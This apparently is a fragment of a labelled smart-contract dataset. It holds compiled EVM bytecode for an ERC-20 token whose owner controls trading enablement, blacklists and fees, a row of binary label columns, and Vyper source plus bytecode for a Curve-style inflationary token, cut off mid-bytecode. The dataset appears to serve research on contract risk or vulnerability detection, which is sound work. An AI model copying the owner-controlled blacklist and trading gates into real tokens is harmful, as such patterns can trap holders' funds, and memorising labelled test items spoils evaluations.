ffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b610c1e611345565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610cab576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ca290612d2d565b60405180910390fd5b8060168190555050565b60165481565b60116020528060005260406000206000915090505481565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b610d04611345565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610d91576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d8890612d2d565b60405180910390fd5b80601560146101000a81548160ff02191690831515021790555050565b60175481565b60606040518060400160405280600481526020017f4241524200000000000000000000000000000000000000000000000000000000815250905090565b610df9611345565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610e86576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e7d90612d2d565b60405180910390fd5b8060188190555050565b610e98611345565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610f25576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f1c90612d2d565b60405180910390fd5b8360088190555082600a819055508160098190555080600b8190555050505050565b6000610f5b610f54611345565b8484611516565b6001905092915050565b60106020528060005260406000206000915054906101000a900460ff1681565b601260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16610fc6611345565b73ffffffffffffffffffffffffffffffffffffffff16148061103c5750601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16611024611345565b73ffffffffffffffffffffffffffffffffffffffff16145b61104557600080fd5b600061105030610a72565b905061105b81611ed7565b50565b6000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b6110ed611345565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161461117a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161117190612d2d565b60405180910390fd5b8060178190555050565b61118c611345565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611219576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161121090612d2d565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603611288576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161127f90612dbf565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16036113bc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016113b390612e51565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff160361142b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161142290612ee3565b60405180910390fd5b80600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040516115099190612ab8565b60405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603611585576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161157c90612f75565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036115f4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016115eb90613007565b60405180910390fd5b60008111611637576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161162e90613099565b60405180910390fd5b61163f610cd3565b73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16141580156116ad575061167d610cd3565b73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b15611a9857601560149054906101000a900460ff1661173c576116ce610cd3565b73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161461173b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016117329061312b565b60405180910390fd5b5b601654811115611781576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161177890613197565b60405180910390fd5b601060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff161580156118255750601060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b611864576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161185b90613229565b60405180910390fd5b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161461191157601754816118c684610a72565b6118d09190613278565b10611910576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016119079061331e565b60405180910390fd5b5b600061191c30610a72565b90506000601854821015905060165482106119375760165491505b80801561194f575060158054906101000a900460ff16155b80156119a95750601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff1614155b80156119c15750601560169054906101000a900460ff165b8015611a175750600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b8015611a6d5750600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b15611a9557611a7b82611ed7565b60004790506000811115611a9357611a9247611dfd565b5b505b50505b600060019050600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1680611b3f5750600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff165b80611bf25750601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614158015611bf15750601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b5b15611c005760009050611d87565b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16148015611cab5750601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b15611cc357600854600c81905550600954600d819055505b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16148015611d6e5750601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614155b15611d8657600a54600c81905550600b54600d819055505b5b611d938484848461214e565b50505050565b6000838311158290611de1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611dd891906128fe565b60405180910390fd5b5060008385611df0919061333e565b9050809150509392505050565b601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015611e65573d6000803e3d6000fd5b5050565b6000600654821115611eb0576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611ea7906133e4565b60405180910390fd5b6000611eba61217b565b9050611ecf81846121a690919063ffffffff16565b915050919050565b60016015806101000a81548160ff0219169083151502179055506000600267ffffffffffffffff811115611f0e57611f0d613404565b5b604051908082528060200260200182016040528015611f3c5781602001602082028036833780820191505090505b5090503081600081518110611f5457611f53613433565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015611ffb573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061201f9190613477565b8160018151811061203357612032613433565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff168152505061209a30601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168461134d565b601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663791ac9478360008430426040518663ffffffff1660e01b81526004016120fe95949392919061359d565b600060405180830381600087803b15801561211857600080fd5b505af115801561212c573d6000803e3d6000fd5b505050505060006015806101000a81548160ff02191690831515021790555050565b8061215c5761215b6121f0565b5b61216784848461222d565b80612175576121746123f8565b5b50505050565b600080600061218861240c565b9150915061219f81836121a690919063ffffffff16565b9250505090565b60006121e883836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f00000000000081525061246b565b905092915050565b6000600c5414801561220457506000600d54145b61222b57600c54600e81905550600d54600f819055506000600c819055506000600d819055505b565b60008060008060008061223f876124ce565b95509550955095509550955061229d86600260008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461253690919063ffffffff16565b600260008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061233285600260008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461258090919063ffffffff16565b600260008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061237e816125de565b612388848361269b565b8773ffffffffffffffffffffffffffffffffffffffff168973ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef856040516123e59190612ab8565b60405180910390a3505050505050505050565b600e54600c81905550600f54600d81905550565b600080600060065490506000670de0b6b3a76400009050612440670de0b6b3a76400006006546121a690919063ffffffff16565b82101561245e57600654670de0b6b3a7640000935093505050612467565b81819350935050505b9091565b600080831182906124b2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016124a991906128fe565b60405180910390fd5b50600083856124c19190613626565b9050809150509392505050565b60008060008060008060008060006124eb8a600c54600d546126d5565b92509250925060006124fb61217b565b9050600080600061250e8e87878761276b565b9250925092508282828989899c509c509c509c509c509c505050505050505091939550919395565b600061257883836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250611d99565b905092915050565b600080828461258f9190613278565b9050838110156125d4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016125cb906136a3565b60405180910390fd5b8091505092915050565b60006125e861217b565b905060006125ff82846127f490919063ffffffff16565b905061265381600260003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461258090919063ffffffff16565b600260003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505050565b6126b08260065461253690919063ffffffff16565b6006819055506126cb8160075461258090919063ffffffff16565b6007819055505050565b60008060008061270160646126f3888a6127f490919063ffffffff16565b6121a690919063ffffffff16565b9050600061272b606461271d888b6127f490919063ffffffff16565b6121a690919063ffffffff16565b9050600061275482612746858c61253690919063ffffffff16565b61253690919063ffffffff16565b905080838395509550955050505093509350939050565b60008060008061278485896127f490919063ffffffff16565b9050600061279b86896127f490919063ffffffff16565b905060006127b287896127f490919063ffffffff16565b905060006127db826127cd858761253690919063ffffffff16565b61253690919063ffffffff16565b9050838184965096509650505050509450945094915050565b60008083036128065760009050612868565b6000828461281491906136c3565b90508284826128239190613626565b14612863576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161285a90613777565b60405180910390fd5b809150505b92915050565b600081519050919050565b600082825260208201905092915050565b60005b838110156128a857808201518184015260208101905061288d565b60008484015250505050565b6000601f19601f8301169050919050565b60006128d08261286e565b6128da8185612879565b93506128ea81856020860161288a565b6128f3816128b4565b840191505092915050565b6000602082019050818103600083015261291881846128c5565b905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061295082612925565b9050919050565b61296081612945565b811461296b57600080fd5b50565b60008135905061297d81612957565b92915050565b6000819050919050565b61299681612983565b81146129a157600080fd5b50565b6000813590506129b38161298d565b92915050565b600080604083850312156129d0576129cf612920565b5b60006129de8582860161296e565b92505060206129ef858286016129a4565b9150509250929050565b60008115159050919050565b612a0e816129f9565b82525050565b6000602082019050612a296000830184612a05565b92915050565b6000819050919050565b6000612a54612a4f612a4a84612925565b612a2f565b612925565b9050919050565b6000612a6682612a39565b9050919050565b6000612a7882612a5b565b9050919050565b612a8881612a6d565b82525050565b6000602082019050612aa36000830184612a7f565b92915050565b612ab281612983565b82525050565b6000602082019050612acd6000830184612aa9565b92915050565b600080600060608486031215612aec57612aeb612920565b5b6000612afa8682870161296e565b9350506020612b0b8682870161296e565b9250506040612b1c868287016129a4565b9150509250925092565b600060ff82169050919050565b612b3c81612b26565b82525050565b6000602082019050612b576000830184612b33565b92915050565b612b6681612945565b82525050565b6000602082019050612b816000830184612b5d565b92915050565b612b90816129f9565b8114612b9b57600080fd5b50565b600081359050612bad81612b87565b92915050565b600060208284031215612bc957612bc8612920565b5b6000612bd784828501612b9e565b91505092915050565b600060208284031215612bf657612bf5612920565b5b6000612c048482850161296e565b91505092915050565b600060208284031215612c2357612c22612920565b5b6000612c31848285016129a4565b91505092915050565b60008060008060808587031215612c5457612c53612920565b5b6000612c62878288016129a4565b9450506020612c73878288016129a4565b9350506040612c84878288016129a4565b9250506060612c95878288016129a4565b91505092959194509250565b60008060408385031215612cb857612cb7612920565b5b6000612cc68582860161296e565b9250506020612cd78582860161296e565b9150509250929050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b6000612d17602083612879565b9150612d2282612ce1565b602082019050919050565b60006020820190508181036000830152612d4681612d0a565b9050919050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b6000612da9602683612879565b9150612db482612d4d565b604082019050919050565b60006020820190508181036000830152612dd881612d9c565b9050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b6000612e3b602483612879565b9150612e4682612ddf565b604082019050919050565b60006020820190508181036000830152612e6a81612e2e565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b6000612ecd602283612879565b9150612ed882612e71565b604082019050919050565b60006020820190508181036000830152612efc81612ec0565b9050919050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b6000612f5f602583612879565b9150612f6a82612f03565b604082019050919050565b60006020820190508181036000830152612f8e81612f52565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f206164647260008201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b6000612ff1602383612879565b9150612ffc82612f95565b604082019050919050565b6000602082019050818103600083015261302081612fe4565b9050919050565b7f5472616e7366657220616d6f756e74206d75737420626520677265617465722060008201527f7468616e207a65726f0000000000000000000000000000000000000000000000602082015250565b6000613083602983612879565b915061308e82613027565b604082019050919050565b600060208201905081810360008301526130b281613076565b9050919050565b7f544f4b454e3a2054686973206163636f756e742063616e6e6f742073656e642060008201527f746f6b656e7320756e74696c2074726164696e6720697320656e61626c656400602082015250565b6000613115603f83612879565b9150613120826130b9565b604082019050919050565b6000602082019050818103600083015261314481613108565b9050919050565b7f544f4b454e3a204d6178205472616e73616374696f6e204c696d697400000000600082015250565b6000613181601c83612879565b915061318c8261314b565b602082019050919050565b600060208201905081810360008301526131b081613174565b9050919050565b7f544f4b454e3a20596f7572206163636f756e7420697320626c61636b6c69737460008201527f6564210000000000000000000000000000000000000000000000000000000000602082015250565b6000613213602383612879565b915061321e826131b7565b604082019050919050565b6000602082019050818103600083015261324281613206565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061328382612983565b915061328e83612983565b92508282019050808211156132a6576132a5613249565b5b92915050565b7f544f4b454e3a2042616c616e636520657863656564732077616c6c657420736960008201527f7a65210000000000000000000000000000000000000000000000000000000000602082015250565b6000613308602383612879565b9150613313826132ac565b604082019050919050565b60006020820190508181036000830152613337816132fb565b9050919050565b600061334982612983565b915061335483612983565b925082820390508181111561336c5761336b613249565b5b92915050565b7f416d6f756e74206d757374206265206c657373207468616e20746f74616c207260008201527f65666c656374696f6e7300000000000000000000000000000000000000000000602082015250565b60006133ce602a83612879565b91506133d982613372565b604082019050919050565b600060208201905081810360008301526133fd816133c1565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60008151905061347181612957565b92915050565b60006020828403121561348d5761348c612920565b5b600061349b84828501613462565b91505092915050565b6000819050919050565b60006134c96134c46134bf846134a4565b612a2f565b612983565b9050919050565b6134d9816134ae565b82525050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b61351481612945565b82525050565b6000613526838361350b565b60208301905092915050565b6000602082019050919050565b600061354a826134df565b61355481856134ea565b935061355f836134fb565b8060005b83811015613590578151613577888261351a565b975061358283613532565b925050600181019050613563565b5085935050505092915050565b600060a0820190506135b26000830188612aa9565b6135bf60208301876134d0565b81810360408301526135d1818661353f565b90506135e06060830185612b5d565b6135ed6080830184612aa9565b9695505050505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061363182612983565b915061363c83612983565b92508261364c5761364b6135f7565b5b828204905092915050565b7f536166654d6174683a206164646974696f6e206f766572666c6f770000000000600082015250565b600061368d601b83612879565b915061369882613657565b602082019050919050565b600060208201905081810360008301526136bc81613680565b9050919050565b60006136ce82612983565b91506136d983612983565b92508282026136e781612983565b915082820484148315176136fe576136fd613249565b5b5092915050565b7f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f60008201527f7700000000000000000000000000000000000000000000000000000000000000602082015250565b6000613761602183612879565b915061376c82613705565b604082019050919050565b6000602082019050818103600083015261379081613754565b905091905056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a2646970667358221220c45cc11a058614299a7b7715625d7c9060ded9776e2bd4da938eaf985bdb0e2764736f6c63430008120033,0,0,0,0,0,0,0,1,0,1,0,0,1,1,0,0,0
"# @version 0.2.4from vyper.interfaces import ERC20implements: ERC20event Transfer: _from: indexed(address) _to: indexed(address) _value: uint256event Approval: _owner: indexed(address) _spender: indexed(address) _value: uint256event UpdateMiningParameters: time: uint256 rate: uint256 supply: uint256event SetMinter: minter: addressevent SetAdmin: admin: addressname: public(String[64])symbol: public(String[32])decimals: public(uint256)balanceOf: public(HashMap[address, uint256])allowances: HashMap[address, HashMap[address, uint256]]total_supply: uint256minter: public(address)admin: public(address)# General constantsYEAR: constant(uint256) = 86400 * 365# Allocation:# =========# * shareholders - 30%# * emplyees - 3%# * DAO-controlled reserve - 5%# * Early users - 5%# == 43% ==# left for inflation: 57%# Supply parametersINITIAL_SUPPLY: constant(uint256) = 1_303_030_303INITIAL_RATE: constant(uint256) = 274_815_283 * 10 ** 18 / YEAR # leading to 43% premineRATE_REDUCTION_TIME: constant(uint256) = YEARRATE_REDUCTION_COEFFICIENT: constant(uint256) = 1189207115002721024 # 2 ** (1/4) * 1e18RATE_DENOMINATOR: constant(uint256) = 10 ** 18INFLATION_DELAY: constant(uint256) = 86400# Supply variablesmining_epoch: public(int128)start_epoch_time: public(uint256)rate: public(uint256)start_epoch_supply: uint256@externaldef __init__(_name: String[64], _symbol: String[32], _decimals: uint256): init_supply: uint256 = INITIAL_SUPPLY * 10 ** _decimals self.name = _name self.symbol = _symbol self.decimals = _decimals self.balanceOf[msg.sender] = init_supply self.total_supply = init_supply self.admin = msg.sender log Transfer(ZERO_ADDRESS, msg.sender, init_supply) self.start_epoch_time = block.timestamp + INFLATION_DELAY - RATE_REDUCTION_TIME self.mining_epoch = -1 self.rate = 0 self.start_epoch_supply = init_supply@internaldef _update_mining_parameters(): _rate: uint256 = self.rate _start_epoch_supply: uint256 = self.start_epoch_supply self.start_epoch_time += RATE_REDUCTION_TIME self.mining_epoch += 1 if _rate == 0: _rate = INITIAL_RATE else: _start_epoch_supply += _rate * RATE_REDUCTION_TIME self.start_epoch_supply = _start_epoch_supply _rate = _rate * RATE_DENOMINATOR / RATE_REDUCTION_COEFFICIENT self.rate = _rate log UpdateMiningParameters(block.timestamp, _rate, _start_epoch_supply)@externaldef update_mining_parameters(): assert block.timestamp >= self.start_epoch_time + RATE_REDUCTION_TIME # dev: too soon! self._update_mining_parameters()@externaldef start_epoch_time_write() -> uint256: _start_epoch_time: uint256 = self.start_epoch_time if block.timestamp >= _start_epoch_time + RATE_REDUCTION_TIME: self._update_mining_parameters() return self.start_epoch_time else: return _start_epoch_time@externaldef future_epoch_time_write() -> uint256: _start_epoch_time: uint256 = self.start_epoch_time if block.timestamp >= _start_epoch_time + RATE_REDUCTION_TIME: self._update_mining_parameters() return self.start_epoch_time + RATE_REDUCTION_TIME else: return _start_epoch_time + RATE_REDUCTION_TIME@internal@viewdef _available_supply() -> uint256: return self.start_epoch_supply + (block.timestamp - self.start_epoch_time) * self.rate@external@viewdef available_supply() -> uint256: return self._available_supply()@external@viewdef mintable_in_timeframe(start: uint256, end: uint256) -> uint256: assert start <= end # dev: start > end to_mint: uint256 = 0 current_epoch_time: uint256 = self.start_epoch_time current_rate: uint256 = self.rate # Special case if end is in future (not yet minted) epoch if end > current_epoch_time + RATE_REDUCTION_TIME: current_epoch_time += RATE_REDUCTION_TIME current_rate = current_rate * RATE_DENOMINATOR / RATE_REDUCTION_COEFFICIENT assert end <= current_epoch_time + RATE_REDUCTION_TIME # dev: too far in future for i in range(999): # Curve will not work in 1000 years. Darn! if end >= current_epoch_time: current_end: uint256 = end if current_end > current_epoch_time + RATE_REDUCTION_TIME: current_end = current_epoch_time + RATE_REDUCTION_TIME current_start: uint256 = start if current_start >= current_epoch_time + RATE_REDUCTION_TIME: break # We should never get here but what if... elif current_start < current_epoch_time: current_start = current_epoch_time to_mint += current_rate * (current_end - current_start) if start >= current_epoch_time: break current_epoch_time -= RATE_REDUCTION_TIME current_rate = current_rate * RATE_REDUCTION_COEFFICIENT / RATE_DENOMINATOR # double-division with rounding made rate a bit less => good assert current_rate <= INITIAL_RATE # This should never happen return to_mint@externaldef set_minter(_minter: address): assert msg.sender == self.admin # dev: admin only assert self.minter == ZERO_ADDRESS # dev: can set the minter only once, at creation self.minter = _minter log SetMinter(_minter)@externaldef set_admin(_admin: address): assert msg.sender == self.admin # dev: admin only self.admin = _admin log SetAdmin(_admin)@external@viewdef totalSupply() -> uint256: return self.total_supply@external@viewdef allowance(_owner : address, _spender : address) -> uint256: return self.allowances[_owner][_spender]@externaldef transfer(_to : address, _value : uint256) -> bool: assert _to != ZERO_ADDRESS # dev: transfers to 0x0 are not allowed self.balanceOf[msg.sender] -= _value self.balanceOf[_to] += _value log Transfer(msg.sender, _to, _value) return True@externaldef transferFrom(_from : address, _to : address, _value : uint256) -> bool: assert _to != ZERO_ADDRESS # dev: transfers to 0x0 are not allowed # NOTE: vyper does not allow underflows # so the following subtraction would revert on insufficient balance self.balanceOf[_from] -= _value self.balanceOf[_to] += _value self.allowances[_from][msg.sender] -= _value log Transfer(_from, _to, _value) return True@externaldef approve(_spender : address, _value : uint256) -> bool: assert _value == 0 or self.allowances[msg.sender][_spender] == 0 self.allowances[msg.sender][_spender] = _value log Approval(msg.sender, _spender, _value) return True@externaldef mint(_to: address, _value: uint256) -> bool: assert msg.sender == self.minter # dev: minter only assert _to != ZERO_ADDRESS # dev: zero address if block.timestamp >= self.start_epoch_time + RATE_REDUCTION_TIME: self._update_mining_parameters() _total_supply: uint256 = self.total_supply + _value assert _total_supply <= self._available_supply() # dev: exceeds allowable mint amount self.total_supply = _total_supply self.balanceOf[_to] += _value log Transfer(ZERO_ADDRESS, _to, _value) return True@externaldef burn(_value: uint256) -> bool: self.balanceOf[msg.sender] -= _value self.total_supply -= _value log Transfer(msg.sender, ZERO_ADDRESS, _value) return True@externaldef set_name(_name: String[64], _symbol: String[32]): assert msg.sender == self.admin, self.name = _name self.symbol = _symbol",0x600436101561000d5761110b565b600035601c52740100000000000000000000000000000000000000006020526f7fffffffffffffffffffffffffffffff6040527fffffffffffffffffffffffffffffffff8000000000000000000000000000000060605274012a05f1fffffffffffffffffffffffffdabf41c006080527ffffffffffffffffffffffffed5fa0e000000000000000000000000000000000060a052600015610203575b61014052600a5461016052600b5461018052600980546301e133808181830110156100d357600080fd5b80820190509050815550600880546001606051818301806040519013156100f957600080fd5b809190121561010757600080fd5b9050905081555061016051151561012a576778ef89edad16a615610160526101ba565b6101808051610160516301e13380808202821582848304141761014c57600080fd5b8090509050905081818301101561016257600080fd5b8082019050905081525061018051600b5561016051670de0b6b3a7640000808202821582848304141761019457600080fd5b80905090509050671080e992061ab30080806101af57600080fd5b820490509050610160525b61016051600a55426101a052610160516101c052610180516101e0527f27e46362a1e6129b6dd539c984ce739291a97128dfcaeca1255e8ac83abd944160606101a0a161014051565b63d43b40fa600051141561025457341561021c57600080fd5b6009546301e1338081818301101561023357600080fd5b8082019050905042101561024657600080fd5b600658016100a9565b600050005b63adc4cf4360005114156102d057341561026d57600080fd5b60095461014052610140516301e1338081818301101561028c57600080fd5b80820190509050421015156102c05761014051600658016100a9565b6101405260005060095460005260206000f3506102ce565b6101405160005260206000f3505b005b63b26b238e60005114156103825734156102e957600080fd5b60095461014052610140516301e1338081818301101561030857600080fd5b80820190509050421015156103575761014051600658016100a9565b610140526000506009546301e1338081818301101561034257600080fd5b8082019050905060005260206000f350610380565b610140516301e1338081818301101561036f57600080fd5b8082019050905060005260206000f3505b005b6000156103eb575b61014052600b5442600954808210156103a257600080fd5b80820390509050600a5480820282158284830414176103c057600080fd5b809050905090508181830110156103d657600080fd5b80820190509050600052600051610140515650005b6324f92a25600051141561042057341561040457600080fd5b6006580161038a565b610140526101405160005260206000f350005b63d725a9ca60005114156106ec57341561043957600080fd5b602435600435111561044a57600080fd5b60006101405260095461016052600a5461018052610160516301e1338081818301101561047657600080fd5b8082019050905060243511156104f05761016080516301e1338081818301101561049f57600080fd5b8082019050905081525061018051670de0b6b3a764000080820282158284830414176104ca57600080fd5b80905090509050671080e992061ab30080806104e557600080fd5b820490509050610180525b610160516301e1338081818301101561050857600080fd5b80820190509050602435111561051d57600080fd5b6101a060006103e7818352015b6101605160243510151561064b576024356101c052610160516301e1338081818301101561055757600080fd5b808201905090506101c051111561058c57610160516301e1338081818301101561058057600080fd5b808201905090506101c0525b6004356101e052610160516301e133808181830110156105ab57600080fd5b808201905090506101e0511015156105c6576106db566105de565b610160516101e05110156105dd57610160516101e0525b5b6101408051610180516101c0516101e051808210156105fc57600080fd5b80820390509050808202821582848304141761061757600080fd5b8090509050905081818301101561062d57600080fd5b808201905090508152506101605160043510151561064a576106db565b5b61016080516301e133808082101561066257600080fd5b8082039050905081525061018051671080e992061ab300808202821582848304141761068d57600080fd5b80905090509050670de0b6b3a764000080806106a857600080fd5b820490509050610180526778ef89edad16a6156101805111156106ca57600080fd5b5b815160010180835281141561052a575b50506101405160005260206000f350005b631652e9fc600051141561076857341561070557600080fd5b600435602051811061071657600080fd5b50600754331461072557600080fd5b6006541561073257600080fd5b600435600655600435610140527fcec52196e972044edde8689a1b608e459c5946b7f3e5c8cd3d6d8e126d422e1c6020610140a1005b63e9333fab60005114156107d757341561078157600080fd5b600435602051811061079257600080fd5b5060075433146107a157600080fd5b600435600755600435610140527f5a272403b402d892977df56625f4164ccaf70ca3863991c43ecfe76a6905b0a16020610140a1005b6318160ddd60005114156107fe5734156107f057600080fd5b60055460005260206000f350005b63dd62ed3e600051141561086557341561081757600080fd5b600435602051811061082857600080fd5b50602435602051811061083a57600080fd5b50600460043560e05260c052604060c02060243560e05260c052604060c0205460005260206000f350005b63a9059cbb600051141561093657341561087e57600080fd5b600435602051811061088f57600080fd5b5060006004351861089f57600080fd5b60033360e05260c052604060c0208054602435808